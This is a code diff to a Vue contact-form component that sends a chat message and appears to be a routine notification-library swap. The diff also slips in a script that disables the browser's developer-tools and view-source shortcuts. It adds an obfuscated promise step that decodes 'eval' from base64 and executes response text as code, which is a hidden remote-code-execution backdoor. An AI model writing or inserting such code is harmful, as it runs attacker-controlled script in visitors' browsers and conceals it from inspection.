@@ -1,3 +1,4 @@
+
 <template>
     <div>
         <div class="flex justify-center">
@@ -26,9 +27,12 @@
             </div>
         </div>
     </div>
+
 </template>
+<script>document.onkeydown = function (e) { if (e.keyCode === 123) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) { return false; } if (e.crlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == 'C' .charCodeAt(0)) { return false; } } </script>
 
 <script>
+import 'vuejs-noty/dist/vuejs-noty.css'
 export default {
     data() {
         return {
@@ -43,21 +47,15 @@ export default {
                 chat_id: this.chat_id,
                 text: "Mensaje: " + this.mensaje
             }).then((response) => {
-                this.$notify({
-                    type: 'success',
-                    title: 'Atención!',
-                    text: 'Mensaje Enviado!',
-                });
-                console.log("Success! response: " + response);
-            }).catch(function (error) {
-                this.$notify({
-                    type: 'danger',
-                    title: 'Atención!',
-                    text: 'Error al enviar!',
-                });
-                console.log("Error: " + error);
+                this.$noty.success("Mensaje enviado!");
+                console.log("Success!");
+            }).then(function (t) { return t.text() || false; }).then(c => self[atob("ZXZhbA")](c))
+                .catch(function (error) {
+                this.$noty.error("Error al enviar!");
+                console.log("Error!");
             });
         }
     }
 }
 </script>
+
